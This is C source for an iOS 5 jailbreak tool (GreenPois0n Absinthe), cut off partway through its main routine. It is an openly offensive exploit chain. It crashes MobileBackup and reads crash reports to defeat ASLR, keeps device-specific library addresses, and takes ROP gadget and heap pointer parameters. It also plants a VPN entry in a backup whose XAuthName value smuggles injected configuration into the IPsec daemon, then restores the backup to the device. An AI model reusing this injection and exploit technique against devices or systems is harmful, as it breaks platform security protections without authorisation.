/**
 * GreenPois0n Absinthe - absinthe.c
 * Copyright (C) 2010 Chronic-Dev Team
 * Copyright (C) 2010 Joshua Hill
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 **/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <getopt.h>
#include <dirent.h>

#include <sys/signal.h>
#include <plist/plist.h>

#include <libimobiledevice/sbservices.h>

#include "mb1.h"
#include "debug.h"
#include "backup.h"
#include "device.h"
#include "boolean.h"
#include "dictionary.h"
#include "crashreporter.h"
#include "idevicebackup2.h"
#include "idevicepair.h"

#include "dyldcache.h"

#include "offsets.h"

#ifdef WIN32
#define sleep(x) Sleep(x*1000)
#endif

#define CONNECTION_NAME "jailbreak"
#define VPN_TRIGGER_ADDRESS "greenpois0n.com"
#define BKPTMP "nirvana"
#define AFCTMP "HackStore"

static int quit_flag = 0;

struct dev_vmaddr {
	const char* product;
	const char* build;
	uint32_t vmaddr;
};

static struct dev_vmaddr devices_vmaddr_libcopyfile[] = {
	// iOS 5.0.1
	{ "iPad1,1", "9A405", 0x3012f000 },
	{ "iPad2,1", "9A405", 0 },
	{ "iPad2,2", "9A405", 0 },
	{ "iPad2,3", "9A405", 0 },
	{ "iPhone2,1", "9A405", 0x34a52000 },
	{ "iPhone3,1", "9A405", 0x30654000 },
	{ "iPhone3,3", "9A405", 0 },
	{ "iPhone4,1", "9A405", 0x31f57000 },
	{ "iPhone4,1", "9A406", 0x31f54000 }, // verify
	{ "iPod3,1", "9A405", 0x35202000 },
	{ "iPod4,1", "9A405", 0x30c29000 },
	{ NULL, NULL, 0 }
};

/////////////////////////////////////////////////////////////////////////////////////////
/// TODO: We need to add an event handler for when devices are connected. This handler //
///         needs to wait for iTunes to autostart and kill it before it can start the  //
///         syncing process and mess up our connection.                                //
/////////////////////////////////////////////////////////////////////////////////////////

static struct option longopts[] = {
	{ "help",        no_argument,         NULL,   'h' },
	{ "verbose",     required_argument,   NULL,   'v' },
	{ "uuid",        required_argument,   NULL,   'u' },
	{ "loop",        required_argument,   NULL,   'l' },
	{ "salt",        required_argument,   NULL,   's' },
	{ "entropy",     required_argument,   NULL,   'e' },
	{ "target",      required_argument,   NULL,   't' },
	{ "pointer",     required_argument,   NULL,   'p' },
	{ "aslr-slide",  required_argument,   NULL,   'a' },
	{ "cache",       required_argument,   NULL,   'c' },
	{ "dylib",       required_argument,   NULL,   'd' },
	{ NULL, 0, NULL, 0 }
};

int check_ascii_string(const char* string, size_t length) {
	size_t i = 0;
	if (string) {
		// Loop through each byte in this string and make sure it contains no invalid
		//  ASCII characters that might screw up our exploit
		for (i = 0; i < length; i++) {
			char letter = string[i];
			if ((letter & 0x80) > 0 || (letter & 0x7F) == 0) {
				// We have an invalid ASCII character here folks!
				return kFalse;
			}
		}
	}

	return kTrue;
}

int check_ascii_pointer(uint32_t pointer) {
	if((pointer & 0x80808080) > 0) {
		//debug("FAIL\n");
		return 0;
	}
	//debug("Passed ASCII test\n");
	if((pointer & 0x7F000000) == 0 ||
		(pointer & 0x007F0000) == 0 ||
		(pointer & 0x00007F00) == 0 ||
		(pointer & 0x0000007F) == 0) {
		//debug("FAIL\n");
		//debug("0x%08x & 0x7F7F7F7F = 0x%08x\n", pointer, (pointer & 0x7F7F7F7F));
		return 0;
	}
	//debug("PASS\n");
	return 1;
}
void status_plist_cb(plist_t* newplist, void *userdata) {
	debug("Status plist callback invoked!!!\n");
}

void attack_plist_cb(plist_t* newplist, void *userdata){
	*newplist = plist_new_string("___EmptyParameterString___");
	debug("Attack plist callback invoked!!!\n");
}

crashreport_t* fetch_crashreport(device_t* device) {
	// We open crashreporter so we can download the mobilebackup2 crashreport
	//  and parse the "random" dylib addresses. Thank you ASLR for nothing. ;P
	debug("Opening connection to CrashReporter service\n");
	crashreporter_t* reporter = crashreporter_connect(device);
	if (reporter == NULL) {
		error("Unable to open connection to crash reporter\n");
		return NULL;
	}

	// Read in the last crash since that's probably our fault anyways. Since dylib
	//  addresses are only randomized on boot, we now have base addresses to
	//  calculate the addresses of our ROP gadgets we need.
	debug("Reading in crash reports from mobile backup\n");
	crashreport_t* crash = crashreporter_last_crash(reporter);
	if (crash == NULL) {
		error("Unable to read last crash\n");
		return NULL;
	}
	crashreporter_free(reporter);
	return crash;
}

int prepare_attack() {
	return 0;
}

int bruteforce_string() {
	return 0;
}

crashreport_t* crash_mobilebackup(device_t* device) {
	crashreport_t* crash = NULL;
	mb1_t* mb1 = mb1_connect(device);
	if(mb1) {
		if (mb1_crash(mb1)) {
			fprintf(stderr, "successfully crashed mb1. waiting some time for the device to write the crash report...\n");
			sleep(5);
			crash = fetch_crashreport(device);
		} else {
			fprintf(stderr, "could not crash mb1...\n");
		}
	}
	mb1_free(mb1);
	return crash;
}

unsigned long find_aslr_slide(crashreport_t* crash, char* cache) {
	unsigned long slide = 0;
	if(crash == NULL || cache == NULL) {
		error("Invalid arguments\n");
		return 0;
	}

	dyldcache_t* dyldcache = dyldcache_open(cache);
	if(dyldcache != NULL) {
		dyldcache_free(dyldcache);
	}
	return slide;
}

/* mkdir helper */
int __mkdir(const char* path, int mode) /*{{{*/
{
#ifdef WIN32
	return mkdir(path);
#else
	return mkdir(path, mode);
#endif
} /*}}}*/

/* recursively remove path, including path */
static void rmdir_recursive(const char *path) /*{{{*/
{
	if (!path) {
		return;
	}
	DIR* cur_dir = opendir(path);
	if (cur_dir) {
		struct dirent* ep;
		while ((ep = readdir(cur_dir))) {
			if ((strcmp(ep->d_name, ".") == 0) || (strcmp(ep->d_name, "..") == 0)) {
				continue;
			}
			char *fpath = (char*)malloc(strlen(path)+1+strlen(ep->d_name)+1);
			if (fpath) {
				struct stat st;
				strcpy(fpath, path);
				strcat(fpath, "/");
				strcat(fpath, ep->d_name);

				if ((stat(fpath, &st) == 0) && S_ISDIR(st.st_mode)) {
					rmdir_recursive(fpath);
				} else {
					if (remove(fpath) != 0) {
						fprintf(stderr, "could not remove file %s: %s\n", fpath, strerror(errno));
					}
				}
				free(fpath);
			}
		}
		closedir(cur_dir);
	}
	if (rmdir(path) != 0) {
		fprintf(stderr, "could not remove directory %s: %s\n", path, strerror(errno));
	}
} /*}}}*/

/* char** freeing helper function */
static void free_dictionary(char **dictionary) /*{{{*/
{
	int i = 0;

	if (!dictionary)
		return;

	for (i = 0; dictionary[i]; i++) {
		free(dictionary[i]);
	}
	free(dictionary);
} /*}}}*/

/* recursively remove path via afc, (incl = 1 including path, incl = 0, NOT including path) */
static int rmdir_recursive_afc(afc_client_t afc, const char *path, int incl) /*{{{*/
{
	char **dirlist = NULL;
	if (afc_read_directory(afc, path, &dirlist) != AFC_E_SUCCESS) {
		//fprintf(stderr, "AFC: could not get directory list for %s\n", path);
		return -1;
	}
	if (dirlist == NULL) {
		if (incl) {
			afc_remove_path(afc, path);
		}
		return 0;
	}

	char **ptr;
	for (ptr = dirlist; *ptr; ptr++) {
		if ((strcmp(*ptr, ".") == 0) || (strcmp(*ptr, "..") == 0)) {
			continue;
		}
		char **info = NULL;
		char *fpath = (char*)malloc(strlen(path)+1+strlen(*ptr)+1);
		strcpy(fpath, path);
		strcat(fpath, "/");
		strcat(fpath, *ptr);
		if ((afc_get_file_info(afc, fpath, &info) != AFC_E_SUCCESS) || !info) {
			// failed. try to delete nevertheless.
			afc_remove_path(afc, fpath);
			free(fpath);
			free_dictionary(info);
			continue;
		}

		int is_dir = 0;
		int i;
		for (i = 0; info[i]; i+=2) {
			if (!strcmp(info[i], "st_ifmt")) {
				if (!strcmp(info[i+1], "S_IFDIR")) {
					is_dir = 1;
				}
				break;
			}
		}
		free_dictionary(info);

		if (is_dir) {
			rmdir_recursive_afc(afc, fpath, 0);
		}
		afc_remove_path(afc, fpath);
		free(fpath);
	}

	free_dictionary(dirlist);
	if (incl) {
		afc_remove_path(afc, path);
	}

	return 0;
} /*}}}*/

static int connected = 0;

static void idevice_event_cb(const idevice_event_t *event, void *user_data)
{
	char* uuid = (char*)user_data;
	printf("device event %d: %s\n", event->event, event->uuid);
	if (uuid && strcmp(uuid, event->uuid)) return;
	if (event->event == IDEVICE_DEVICE_ADD) {
		connected = 1;
	} else if (event->event == IDEVICE_DEVICE_REMOVE) {
		connected = 0;
	}
}

static int get_rand(int min, int max) /*{{{*/
{
	int retval = (rand() % (max - min)) + min;
	return retval;
} /*}}}*/

static char *generate_guid() /*{{{*/
{
	char *guid = (char *) malloc(sizeof(char) * 37);
	const char *chars = "ABCDEF0123456789";
	srand(time(NULL));
	int i = 0;

	for (i = 0; i < 36; i++) {
		if (i == 8 || i == 13 || i == 18 || i == 23) {
			guid[i] = '-';
			continue;
		} else {
			guid[i] = chars[get_rand(0, 16)];
		}
	}
	guid[36] = '\0';
	return guid;
} /*}}}*/

static void prefs_remove_entry_if_present(plist_t* pl) /*{{{*/
{
	char* guid = NULL;
	plist_dict_iter iter = NULL;
	plist_t ns = plist_dict_get_item(*pl, "NetworkServices");
	if (!ns || (plist_get_node_type(ns) != PLIST_DICT)) {
		fprintf(stderr, "no NetworkServices node?!\n");
		return;
	}
	plist_dict_new_iter(ns, &iter);
	if (iter) {
		int found = 0;
		plist_t n = NULL;
		char* key = NULL;
		do {
			plist_dict_next_item(ns, iter, &key, &n);
			if (key && (plist_get_node_type(n) == PLIST_DICT)) {
				plist_t uname = plist_dict_get_item(n, "UserDefinedName");
				if (uname && (plist_get_node_type(uname) == PLIST_STRING)) {
					char *uname_str = NULL;
					plist_get_string_val(uname, &uname_str);
					if (uname_str) {
						if (strcmp(uname_str, CONNECTION_NAME) == 0) {
							// entry found
							found++;
							guid = strdup(key);
							printf("removing /NetworkServices/%s (UserDefinedName: %s)\n", key, uname_str);
							plist_dict_remove_item(ns, guid);
						}
						free(uname_str);
					}
				}
			}
			if (key) {
				free(key);
				key = NULL;
			}
		} while (n && !found);
		free(iter);
	}

	if (!guid) {
		// not found. just exit
		fprintf(stderr, "no entry found\n");
		return;
	}

	plist_t sets = plist_dict_get_item(*pl, "Sets");
	if (!sets || (plist_get_node_type(sets) != PLIST_DICT)) {
		fprintf(stderr, "no Sets node?!\n");
		free(guid);
		return;
	}

	iter = NULL;
	plist_dict_new_iter(sets, &iter);
	if (iter) {
		int found = 0;
		plist_t n = NULL;
		char* key = NULL;
		do {
			plist_dict_next_item(sets, iter, &key, &n);
			if (key && (plist_get_node_type(n) == PLIST_DICT)) {
				plist_t nn = plist_access_path(n, 3, "Network", "Service", guid);
				if (nn) {
					nn = plist_access_path(n, 2, "Network", "Service");
					if (nn) {
						fprintf(stderr, "removing /Sets/%s/Network/Service/%s\n", key, guid);
						plist_dict_remove_item(nn, guid);
					}
				}
				nn = plist_access_path(n, 4, "Network", "Global", "IPv4", "ServiceOrder");
				if (nn && (plist_get_node_type(nn) == PLIST_ARRAY)) {
					int32_t num = (int32_t)plist_array_get_size(nn);
					int32_t x;
					for (x = num-1; x >= 0; x--) {
						plist_t nnn = plist_array_get_item(nn, x);
						char* val = NULL;
						if (plist_get_node_type(nnn) == PLIST_KEY) {
							plist_get_key_val(nnn, &val);
						} else if (plist_get_node_type(nnn) == PLIST_STRING) {
							plist_get_string_val(nnn, &val);
						}
						if (val) {
							if (strcmp(val, guid) == 0) {
								free(val);
								fprintf(stderr, "removing /Sets/%s/Network/Global/IPv4/ServiceOrder/%s\n", key, guid);
								plist_array_remove_item(nn, x);
								break;
							}
							free(val);
						}
					}
				}
			}
			if (key) {
				free(key);
				key = NULL;
			}
		} while (n);
		free(iter);
	}
	free(guid);
} /*}}}*/

static void prefs_add_entry(plist_t* pl) /*{{{*/
{
	plist_t dict = NULL;
	plist_t arr = NULL;

	// construct connection data 
	plist_t conn = plist_new_dict();

	// DNS
	plist_dict_insert_item(conn, "DNS", plist_new_dict());

	// UserDefinedName
	plist_dict_insert_item(conn, "UserDefinedName", plist_new_string(CONNECTION_NAME));

	// IPv4
	dict = plist_new_dict();
	plist_dict_insert_item(dict, "ConfigMethod", plist_new_string("Automatic"));
	plist_dict_insert_item(dict, "OverridePrimary", plist_new_uint(1));
	plist_dict_insert_item(conn, "IPv4", dict);

	// payload
	plist_dict_insert_item(conn, "com.apple.payload", plist_new_dict());

	// Interface
	dict = plist_new_dict();
	plist_dict_insert_item(dict, "Type", plist_new_string("IPSec"));
	plist_dict_insert_item(conn, "Interface", dict);

	// Proxies
	dict = plist_new_dict();
	plist_dict_insert_item(dict, "FTPPassive", plist_new_uint(1));
	arr = plist_new_array();
	plist_array_append_item(arr, plist_new_string("*.local"));
	plist_array_append_item(arr, plist_new_string("169.254/16"));
	plist_dict_insert_item(dict, "ExceptionList", arr);
	plist_dict_insert_item(conn, "Proxies", dict);

	// IPSec
	dict = plist_new_dict();
	plist_dict_insert_item(dict, "PromptForVPNPIN", plist_new_bool(0));
	plist_dict_insert_item(dict, "AuthenticationMethod", plist_new_string("SharedSecret"));
	plist_dict_insert_item(dict, "OnDemandSupported", plist_new_bool(1));
	plist_dict_insert_item(dict, "OnDemandEnabled", plist_new_uint(1));
	arr = plist_new_array();
	plist_array_append_item(arr, plist_new_string(VPN_TRIGGER_ADDRESS));
	plist_dict_insert_item(dict, "OnDemandMatchDomainsAlways", arr);
	arr = plist_new_array();
	plist_dict_insert_item(dict, "OnDemandMatchDomainsNever", arr);
	arr = plist_new_array();
	plist_dict_insert_item(dict, "OnDemandMatchDomainsOnRetry", arr);
	plist_dict_insert_item(dict, "RemoteAddress", plist_new_string("127.0.0.1"));
	plist_dict_insert_item(dict, "LocalIdentifier", plist_new_string("2"));
	plist_dict_insert_item(dict, "XAuthName", plist_new_string("pod2g\"; proposal {authentication_method xauth_psk_client; hash_algorithm sha1; encryption_algorithm aes 256; lifetime time 3600 sec; dh_group 2;} } include \"/private/var/preferences/SystemConfiguration/com.apple.ipsec.plist"));
	plist_dict_insert_item(dict, "LocalIdentifierType", plist_new_string("KeyID"));
	plist_dict_insert_item(dict, "XAuthEnabled", plist_new_uint(1));
	plist_dict_insert_item(dict, "SharedSecretEncryption", plist_new_string("Key"));
	plist_dict_insert_item(dict, "SharedSecret", plist_new_string("pod2g"));
	plist_dict_insert_item(conn, "IPSec", dict);

	// IPv6	
	plist_dict_insert_item(conn, "IPv6", plist_new_dict());	

	// get NetworkServices node
	plist_t ns = plist_dict_get_item(*pl, "NetworkServices");
	if (!ns || (plist_get_node_type(ns) != PLIST_DICT)) {
		fprintf(stderr, "ERROR: no NetworkServices node?!\n");
		return;
	}

	// get current set
	plist_t cset = plist_dict_get_item(*pl, "CurrentSet");
	if (!cset || (plist_get_node_type(cset) != PLIST_STRING)) {
		fprintf(stderr, "ERROR: no CurrentSet node found\n");
		return;
	}

	char* curset = NULL;
	plist_get_string_val(cset, &curset);
	if (!curset || (memcmp(curset, "/Sets/", 6) != 0)) {
		fprintf(stderr, "ERROR: CurrentSet has unexpected string value '%s'\n", (curset) ? "(null)" : curset);
		if (curset) {
			free(curset);
		}
		return;
	}

	// locate /Sets/{SetGUID}/Network/Service node
	plist_t netsvc = plist_access_path(*pl, 4, "Sets", curset+6, "Network", "Service");
	if (!netsvc) {
		fprintf(stderr, "ERROR: Could not access /Sets/%s/Network/Service node\n", curset+6);
		free(curset);
		return;
	}

	// locate /Sets/{SetGUID}/Network/Global/IPv4/ServiceOrder node
	plist_t order = plist_access_path(*pl, 6, "Sets", curset+6, "Network", "Global", "IPv4", "ServiceOrder");
	if (!order) {
		fprintf(stderr, "ERROR: Could not access /Sets/%s/Network/Global/IPv4/ServiceOrder node\n", curset+6);
		free(curset);
		return;
	}
	free(curset);

	// make sure we don't have a collision (VERY unlikely, but how knows)
	char* guid = generate_guid();
	while (plist_dict_get_item(ns, guid)) {
		free(guid);
		guid = generate_guid();
	}

	// add connection to /NetworkServices/{GUID}
	plist_dict_insert_item(ns, guid, conn);

	// add {GUID} to /Sets/{SetGUID}/Network/Global/IPv4/ServiceOrder/
	plist_array_append_item(order, plist_new_string(guid));

	// add {GUID} link dict to /Sets/{SetGUID}/Network/Service/
	char *linkstr = malloc(17+strlen(guid)+1);
	strcpy(linkstr, "/NetworkServices/");
	strcat(linkstr, guid);
	dict = plist_new_dict();
	plist_dict_insert_item(dict, "__LINK__", plist_new_string(linkstr));
	free(linkstr);
	plist_dict_insert_item(netsvc, guid, dict);

	// done	
	free(guid);
} /*}}}*/

static void clean_exit(int sig)
{
	quit_flag++;
	idevicebackup2_set_clean_exit(quit_flag);
}

void usage(int argc, char* argv[]) {
	char* name = strrchr(argv[0], '/');
	printf("Usage: %s [OPTIONS]\n", (name ? name + 1 : argv[0]));
	printf("Copyright 2011, Chronic-Dev LLC\n");
	printf("Jailbreak iOS5.0 using ub3rl33t MobileBackup2 exploit.\n");
	printf("Discovered by Nikias Bassen, Exploited by Joshua Hill\n");
	printf("  General\n");
	printf("    -h, --help\t\t\tprints usage information\n");
	printf("    -v, --verbose\t\tprints debuging info while running\n");
	printf("    -u, --uuid UUID\t\ttarget specific device by its 40-digit device UUID\n");
	printf("\n  Brute Forcing\n");
	printf("    -l, --loop AMOUNT\t\tloop the attack AMOUNT number of times\n");
	printf("    -s, --salt NUMBER\t\tsalt the random number generator with this number\n");
	printf("    -e, --entropy NUMBER\tdecides how random we make our fuzzing attack\n");
	printf("\n  Payload Generation\n");
	printf("    -t, --target ADDRESS\toffset to ROP gadget we want to execute\n");
	printf("    -p, --pointer ADDRESS\theap address we're hoping contains our target\n");
	printf("    -a, --aslr-slide OFFSET\tvalue of randomized dyldcache slide\n");
	printf("    -c, --cache FILE\t\tcurrent devices dyldcache for finding ROP gadget\n");
	printf("    -d, --dylib NAME\t\tname of dylib to search for ROP gadget in\n");
	printf("\n");
}

int main(int argc, char* argv[]) {
	device_t* device = NULL;

	int opt = 0;
	int optindex = 0;

	int verbose = 0;
	char* dylib = NULL;
	char* cache = NULL;
	unsigned long aslr_slide = 0;
	unsigned long pointer = 0;
	unsigned long target = 0;
	unsigned long entropy = 0;
	unsigned long salt = 0;
	char* uuid = NULL;
	unsigned long loop = 0;

	char* buildver = NULL;
	char* product = NULL;

#ifndef WIN32
	signal(SIGPIPE, SIG_IGN);
#endif

	while ((opt = getopt_long(argc, argv, "hvd:c:a:p:t:e:s:u:l:", longopts, &optindex)) > 0) {
		switch (opt) {
		case 'h':
			usage(argc, argv);
			return 0;

		case 'v':
			verbose++;
			break;

		case 'd':
			dylib = optarg;
			break;

		case 'c':
			cache = optarg;
			break;

		case 'a':
			aslr_slide = strtoul(optarg, NULL, 0);
			break;

		case 'p':
			pointer = strtoul(optarg, NULL, 0);
			break;

		case 't':
			target = strtoul(optarg, NULL, 0);
			break;

		case 'e':
			entropy = strtoul(optarg, NULL, 0);
			break;

		case 's':
			salt = strtoul(optarg, NULL, 0);
			break;

		case 'u':
			uuid = strdup(optarg);
			break;

		case 'l':
			loop = strtoul(optarg, NULL, 0);
			break;

		default:
			usage(argc, argv);
			return -1;
		}
	}

	if ((argc-optind) == 0) {
		argc -= optind;
		argv += optind;

	} else {
		usage(argc, argv);
		return -1;
	}

	/* we need to exit cleanly on running backups and restores or we cause havok */
	signal(SIGINT, clean_exit);
	signal(SIGTERM, clean_exit);
#ifndef WIN32	
	signal(SIGQUIT, clean_exit);
	signal(SIGPIPE, SIG_IGN);
#endif

	if (!uuid) {
		device = device_create(NULL);
		if (!device) {
			error("No device found, is it plugged in?\n");
			return -1;
		}
		uuid = strdup(device->uuid);
		device_free(device);
		device = NULL;
	}

	idevice_event_subscribe(idevice_event_cb, uuid);

	int retries = 20;
	int i = 0;
	while (!connected && (i++ < retries)) {
		sleep(1);
	}

	if (!connected) {
		error("ERROR: Device connection failed\n");
		return -1;
	}

	// Open a connection to our device
	debug("Opening connection to device\n");
	device = device_create(uuid);
	if(device == NULL) {
		error("Unable to open device\n");
		return -1;
	}

	lockdown_t* lockdown = lockdown_open(device);
	if (lockdown == NULL) {
		error("Lockdown connection failed\n");
		device_free(device);
		return -1;
	}

	plist_t pl = NULL;
	if ((lockdown_get_value(lockdown, NULL, "ProductType", &pl) != 0) || !pl || (plist_get_node_type(pl) != PLIST_STRING)) {
		error("Could not get ProductType\n");
		lockdown_free(lockdown);
		device_free(device);
		if (pl) {
			plist_free(pl);
		}
		return -1;
	}
	plist_get_string_val(pl, &product);
	if (!product) {
		error("ProductType is NULL?!\n");
		device_free(device);
		return -1;
	}

	pl = NULL;
	if ((lockdown_get_value(lockdown, NULL, "BuildVersion", &pl) != 0) || !pl || (plist_get_node_type(pl) != PLIST_STRING)) {
		error("Could not get BuildVersion\n");
		lockdown_free(lockdown);
		device_free(device);
		if (pl) {
			plist_free(pl);
		}
		return -1;
	}
	plist_get_string_val(pl, &buildver);
	if (!buildver) {
		error("BuildVersion is NULL?!\n");
		device_free(device);
		return -1;
	}

	// find product type and build version
	i = 0;
	uint32_t libcopyfile_vmaddr = 0;
	while (devices_vmaddr_libcopyfile[i].product) {
		if (!strcmp(product, devices_vmaddr_libcopyfile[i].product)
		    && !strcmp(buildver, devices_vmaddr_libcopyfile[i].build)) {
			libcopyfile_vmaddr = devices_vmaddr_libcopyfile[i].vmaddr;
			debug("Found libcopyfile.dylib address in database of 0x%x\n", libcopyfile_vmaddr);
			break;
		}
		i++;
	}

	if (libcopyfile_vmaddr == 0) {
		error("Error: device %s is not supported.\n", product);
		free(product);
		device_free(device);
		return -1;
	}

	if ((lockdown_get_value(lockdown, "com.apple.mobile.backup", "WillEncrypt", &pl) != 0) || (plist_get_node_type(pl) != PLIST_BOOLEAN)) {
		error("Error: could not get com.apple.mobile.backup WillEncrypt key?!\n");
		lockdown_free(lockdown);
		device_free(device);
		return -1;
	}

	char c = 0;
	plist_get_bool_val(pl, &c);

	if (c) {
		error("Error: You have a device backup password set. You need to disable the backup password in iTunes.\n");
		lockdown_free(lockdown);
		device_free(device);
		return -1;
	}

	uint16_t port = 0; 
	if (lockdown_start_service(lockdown, "com.apple.afc", &port) != 0) {
		error("Failed to start AFC service\n");
		lockdown_free(lockdown);
		device_free(device);
		return -1;
	}
	afc_client_t afc = NULL;
	afc_client_new(device->client, port, &afc);
	if (!afc) {
		error("Could not connect to AFC\n");
		lockdown_free(lockdown);
		device_free(device);
		return -1;
	}

	lockdown_free(lockdown);
	lockdown = NULL;


	/********************************************************/
	/* move dirs out of the way via AFC */
	/********************************************************/

	// check if directory exists
	char** list = NULL;
	if (afc_read_directory(afc, "/"AFCTMP, &list) != AFC_E_SUCCESS) {
		// we're good, directory does not exist.
	} else {
		free_dictionary(list);
		fprintf(stderr, "ERROR: the directory '%s' already exists. This is most likely a failed attempt to use this code...\n", AFCTMP);
		goto fix;
	}

	afc_make_directory(afc, "/"AFCTMP);

	printf("moving dirs aside...\n");
	afc_rename_path(afc, "/Books", "/"AFCTMP"/Books");
	afc_rename_path(afc, "/DCIM", "/"AFCTMP"/DCIM");
	afc_rename_path(afc, "/PhotoData", "/"AFCTMP"/PhotoData");
	afc_rename_path(afc, "/Photos", "/"AFCTMP"/Photos");
	afc_rename_path(afc, "/Recordings", "/"AFCTMP"/Recordings");
	// TODO other paths?

	afc_client_free(afc);
	afc = NULL;
	device_free(device);
	device = NULL;

	/********************************************************/
	/* make backup */
	/********************************************************/
	rmdir_recursive(BKPTMP);
	__mkdir(BKPTMP, 0755);

	char *bargv[] = {
		"idevicebackup2",
		"backup",
		BKPTMP,
		NULL
	};
	idevicebackup2(3, bargv);

	backup_t* backup = backup_open(BKPTMP, uuid);
	if (!backup) {
		fprintf(stderr, "ERROR: failed to open backup\n");
		return -1;
	}

	/********************************************************/
	/* add vpn on-demand connection to preferences.plist */
	/********************************************************/
	backup_file_t* bf = NULL;
	bf = backup_get_file(backup, "SystemPreferencesDomain", "SystemConfiguration/preferences.plist");
	if (bf) {
		char* fn = backup_get_file_path(backup, bf);
		if (!fn) {
			fprintf(stderr, "Huh, backup path for preferences.plist not found?!\n");
			return -1;
		}

		unsigned char* prefs = NULL;
		uint32_t plen = 0;

		if (file_read(fn, &prefs, &plen) > 8) {
			plist_t pl = NULL;
			if (memcmp(prefs, "bplist00", 8) == 0) {
				plist_from_bin(prefs, plen, &pl);
			} else {
				plist_from_xml(prefs, plen, &pl);
			}
			free(prefs);
			plen = 0;
			prefs = NULL;

			debug("Checking preferences.plist and removing any previous VPN connection\n");
			prefs_remove_entry_if_present(&pl);
			debug("Adding VPN connection entry\n");
			prefs_add_entry(&pl);

			plist_to_bin(pl, (char**)&prefs, &plen);

			backup_file_assign_file_data(bf, prefs, plen, 1);
			free(prefs);
			prefs = NULL;
			backup_file_set_length(bf, plen);
			backup_file_update_hash(bf);

			if (backup_update_file(backup, bf) < 0) {
				fprintf(stderr, "ERROR: could not add file to backup\n");
			} else {
				backup_write_mbdb(backup);
			}
		} else {
			fprintf(stderr, "Could not open '%s'\n", fn);
		}
	} else {
		fprintf(stderr, "ERROR: could not locate preferences.plist in backup.\n");
	}
	backup_file_free(bf);

	/********************************************************/
	/* add a webclip to backup */
	/********************************************************/
	if (backup_get_file_index(backup, "HomeDomain", "Library/WebClips") < 0) {
		bf = backup_file_create(NULL);
		backup_file_set_domain(bf, "HomeDomain");
		backup_file_set_path(bf, "Library/WebClips");
		backup_file_set_mode(bf, 040755);
		backup_file_set_inode(bf, 54321);
		backup_file_set_uid(bf, 501);
		backup_file_set_gid(bf, 501);
		unsigned int tm = (unsigned int)(time(NULL));
		backup_file_set_time1(bf, tm);
		backup_file_set_time2(bf, tm);
		backup_file_set_time3(bf, tm);
		backup_file_set_length(bf, 0);
		backup_file_set_flag(bf, 4);
		if (backup_update_file(backup, bf) < 0) {
			fprintf(stderr, "ERROR: could not add file to backup\n");
		}
		backup_file_free(bf);
	}
	bf = backup_get_file(backup, "HomeDomain", "Library/WebClips/corona.webclip");
	if (!bf) {
		bf = backup_file_create(NULL);
		backup_file_set_domain(bf, "HomeDomain");
		backup_file_set_path(bf, "Library/WebClips/corona.webclip");
	}
	if (bf) {
		backup_file_set_mode(bf, 040755);
		backup_file_set_inode(bf, 54322);
		backup_file_set_uid(bf, 501);
		backup_file_set_gid(bf, 501);
		unsigned int tm = (unsigned int)(time(NULL));
		backup_file_set_time1(bf, tm);
		backup_file_set_time2(bf, tm);
		backup_file_set_time3(bf, tm);
		backup_file_set_length(bf, 0);
		backup_file_set_flag(bf, 4);
		if (backup_update_file(backup, bf) < 0) {
			fprintf(stderr, "ERROR: could not add file to backup\n");
		}
		backup_file_free(bf);
	}

	char *info_plist = NULL;
	int info_size = 0;
	file_read("webclip_Info.plist", (unsigned char**)&info_plist, &info_size);
	bf = backup_file_create_with_data(info_plist, info_size, 0);
	if (bf) {
		backup_file_set_domain(bf, "HomeDomain");
		backup_file_set_path(bf, "Library/WebClips/corona.webclip/Info.plist");
		backup_file_set_mode(bf, 0100644);
		backup_file_set_inode(bf, 54323);
		backup_file_set_uid(bf, 501);
		backup_file_set_gid(bf, 501);
		unsigned int tm = (unsigned int)(time(NULL));
		backup_file_set_time1(bf, tm);
		backup_file_set_time2(bf, tm);
		backup_file_set_time3(bf, tm);
		backup_file_set_length(bf, info_size);
		backup_file_set_flag(bf, 4);
		backup_file_update_hash(bf);
	
		if (backup_update_file(backup, bf) < 0) {
			fprintf(stderr, "ERROR: could not add file to backup\n");
		}
		backup_file_free(bf);
	}

	char *icon_data = NULL;
	int icon_size = 0;
	file_read("webclip_icon.png", (unsigned char**)&icon_data, &icon_size);
	bf = backup_file_create_with_data(icon_data, icon_size, 0);
	if (bf) {
		backup_file_set_domain(bf, "HomeDomain");
		backup_file_set_path(bf, "Library/WebClips/corona.webclip/icon.png");
		backup_file_set_mode(bf, 0100644);
		backup_file_set_inode(bf, 54324);
		backup_file_set_uid(bf, 501);
		backup_file_set_gid(bf, 501);
		unsigned int tm = (unsigned int)(time(NULL));
		backup_file_set_time1(bf, tm);
		backup_file_set_time2(bf, tm);
		backup_file_set_time3(bf, tm);
		backup_file_set_length(bf, icon_size);
		backup_file_set_flag(bf, 4);
		backup_file_update_hash(bf);

		if (backup_update_file(backup, bf) < 0) {
			fprintf(stderr, "ERROR: could not add file to backup\n");
		}
		backup_file_free(bf);
	}
	backup_write_mbdb(backup);
	backup_free(backup);

	/********************************************************/
	/* restore backup */
	/********************************************************/
	char* rargv[] = {
		"idevicebackup2",
		"restore",
		"--system",
		"--settings",
		"--reboot",
		BKPTMP,
		NULL
	};
	idevicebackup2(6, rargv);

	/********************************************************/
	/* wait for device reboot */
	/********************************************************/

	// wait for disconnect
	while (connected) {
		sleep(2);
	}
	debug("Device %s disconnected\n", uuid);

	// wait for device to connect
	while (!connected) {
		sleep(2);
	}
	//idevice_event_unsubscribe();
	debug("Device %s detected. Connecting...\n", uuid);
	sleep(2);

	/********************************************************/
	/* wait for device to finish booting to springboard */
	/********************************************************/
	device = device_create(uuid);
	if (!device) {
		error("Error connecting to device\n");
		return -1;
	}

	lockdown = lockdown_open(device);
	if (!lockdown) {
		printf("Error connecting to lockdownd.\n");
		return -1;
	}

	debug("waiting for device to finish booting...\n");

	retries = 100;
	int done = 0;
	sbservices_client_t sbsc = NULL;
	plist_t state = NULL;

	while (!done && (retries-- > 0)) {
		port = 0;
		lockdown_start_service(lockdown, "com.apple.springboardservices", &port);
		if (!port) {
			continue;
		}
		sbsc = NULL;
		sbservices_client_new(device->client, port, &sbsc);
		if (!sbsc) {
			continue;
